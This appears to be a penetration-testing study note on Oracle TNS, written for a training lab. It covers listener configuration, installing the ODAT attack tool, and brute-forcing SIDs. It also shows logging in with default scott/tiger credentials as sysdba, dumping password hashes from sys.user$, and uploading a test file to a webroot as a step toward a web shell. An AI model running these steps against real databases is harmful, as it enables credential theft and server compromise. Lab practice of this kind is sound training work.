---
title: Oracle - TNS Transparent Network Substate
date: 2024-10-30
tags: 
techniques: 
tools:
  - tns
  - odat
  - sqlplus
machines: 
difficulty: 
status: 
type: 
os: 
categories: 
exam-priority: 
time-invested:
---
>[!tip]- Tips
>Write tips here

### References
- Layered Enumeration Framework Guide
- Comprehensive OSCP Enumeration Strategies

#### **Overview**

Oracle TNS facilitates communication between Oracle databases and applications over networks using various protocols, such as **IPX/SPX** and **TCP/IP**.

- **Introduced in:** Oracle Net Services suite.
- **Commonly used in:** Healthcare, finance, retail industries.
- **Key Features:**
    - Built-in encryption for secure data transmission.
    - Support for IPv6 and **SSL/TLS encryption** for secure communication.
    - Enables **name resolution**, **connection management**, **load balancing**, and **security enhancements**.

#### **Functional Capabilities**

1. **Encryption:**
    
    - Provides an extra security layer over **TCP/IP**.
    - Secures communication between client and server.
2. **Database Administration Tools:**
    
    - Performance monitoring and analysis.
    - Error reporting and logging.
    - Workload management and fault tolerance.

---

### **Default Configuration**

- **Port:** Default listener port is **TCP/1521** (modifiable).
    
- **Protocol Support:** TCP/IP, UDP, IPX/SPX, AppleTalk.
    
- **Security Features:**
    
    - Authentication with hostnames, IP addresses, usernames, and passwords.
    - Encryption of client-server communication via Oracle Net Services.
- **Configuration Files:**
    
    - **`tnsnames.ora:`** Resolves service names to network addresses.
    - **`listener.ora:`** Configures listener behavior and services it supports.

#### **File Locations**

- Found in: `$ORACLE_HOME/network/admin`.
- Example `tnsnames.ora` entry:
    
    `ORCL =   (DESCRIPTION =     (ADDRESS_LIST =       (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))     )     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = orcl)     )   )`
    
- Example `listener.ora` entry:
    
    `SID_LIST_LISTENER =   (SID_LIST =     (SID_DESC =       (SID_NAME = PDB1)       (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)       (GLOBAL_DBNAME = PDB1)     )   )  LISTENER =   (DESCRIPTION_LIST =     (DESCRIPTION =       (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))     )   )`
    

---

### **Security Considerations**

- Default passwords in older Oracle versions (e.g., **CHANGE_ON_INSTALL**, **dbsnmp**) should be updated.
- The **PL/SQL Exclusion List** can blacklist certain packages or types to prevent unauthorized access.

#### **PL/SQL Exclusion List**

- File Location: `$ORACLE_HOME/sqldeveloper`.
- Purpose: Blocks execution of specified PL/SQL packages or types.

---

| Setting                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Description |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- |
| \|                      \|                                                                                                                          \|<br>\| -------------------- \| ------------------------------------------------------------------------------------------------------------------------ \|<br>\| `DESCRIPTION`        \| A descriptor that provides a name for the database and its connection type.                                              \|<br>\|                      \|                                                                                                                          \|<br>\| `ADDRESS`            \| The network address of the database, which includes the hostname and port number.                                        \|<br>\| `PROTOCOL`           \| The network protocol used for communication with the server                                                              \|<br>\| `PORT`               \| The port number used for communication with the server                                                                   \|<br>\| `CONNECT_DATA`       \| Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. \|<br>\| `INSTANCE_NAME`      \| The name of the database instance the client wants to connect.                                                           \|<br>\| `SERVICE_NAME`       \| The name of the service that the client wants to connect to.                                                             \|<br>\| `SERVER`             \| The type of server used for the database connection, such as dedicated or shared.                                        \|<br>\| `USER`               \| The username used to authenticate with the database server.                                                              \|<br>\| `PASSWORD`           \| The password used to authenticate with the database server.                                                              \|<br>\| `SECURITY`           \| The type of security for the connection.                                                                                 \|<br>\| `VALIDATE_CERT`      \| Whether to validate the certificate using SSL/TLS.                                                                       \|<br>\| `SSL_VERSION`        \| The version of SSL/TLS to use for the connection.                                                                        \|<br>\| `CONNECT_TIMEOUT`    \| The time limit in seconds for the client to establish a connection to the database.                                      \|<br>\| `RECEIVE_TIMEOUT`    \| The time limit in seconds for the client to receive a response from the database.                                        \|<br>\| `SEND_TIMEOUT`       \| The time limit in seconds for the client to send a request to the database.                                              \|<br>\| `SQLNET.EXPIRE_TIME` \| The time limit in seconds for the client to detect a connection has failed.                                              \|<br>\| `TRACE_LEVEL`        \| The level of tracing for the database connection.                                                                        \|<br>\| `TRACE_DIRECTORY`    \| The directory where the trace files are stored.                                                                          \|<br>\| `TRACE_FILE_NAME`    \| The name of the trace file.                                                                                              \|<br>\| `LOG_FILE`           \| The file where the log information is stored.                                                                            \| |             |
|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |             |


Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our `Pwnbox` instance in case it does not have these already. Here is a Bash script that does all of that:

#### Oracle-Tools-setup.sh
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```
After we can determine if the installation was successful by running the following command.
```bash
# Oracle Database Attacking Tool (odat)
./odat.py -h
```
Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.
![[Pasted image 20241112111023.png]]


[[Nmap]]
```bash
sudo nmap -p1521 -sV <ip> --open

#Nmap - SID Bruteforcing
sudo nmap -p1521 -sV <ip> --open --script oracle-sid-brute


```

## ODAT
```bash
## lets use all options
./odat.py all -s <ip>

##If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```



#### once we found the user and password by running the `odat` we can use a tool `sqlplus` to login to the database.
```bash
sqlplus <user>/<password>@<ip>/XE
```

#### Oracle RDBMS - Interaction

```bash
select table_name from all_tables;

select * from user_role_privs;
```
#### Oracle RDBMS - Database Enumeration
```bash
sqlplus scott/tiger@<ip>/XE as sysdba

SQL> select * from user_role_privs;
```

#### Oracle RDBMS - Extract Password Hashes

```bash
select name, password from sys.user$;
```

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

```shell
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.
```shell
curl -X GET http://10.129.204.235/testing.txt
```
![[Pasted image 20241113002632.png]]
### **Exam Tips & Key Points**

1. **Default Port:** **TCP/1521** – modify as needed.
2. **Two Key Config Files:**
    - **`tnsnames.ora:`** Client-side service resolution.
    - **`listener.ora:`** Server-side listener configuration.
3. **Security Enhancements:** Enable SSL/TLS, change default passwords, and use the **PL/SQL Exclusion List** for blacklisting.
4. **Real-Life Use Case:** Useful in environments prioritizing **data security** and **enterprise-grade performance**.

By remembering the critical configurations, key files, and security recommendations, you can approach Oracle TNS with confidence during exams or penetration testing scenarios.


## Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

![[Pasted image 20241113010632.png]]![[Pasted image 20241113010710.png]]
![[Pasted image 20241113010729.png]]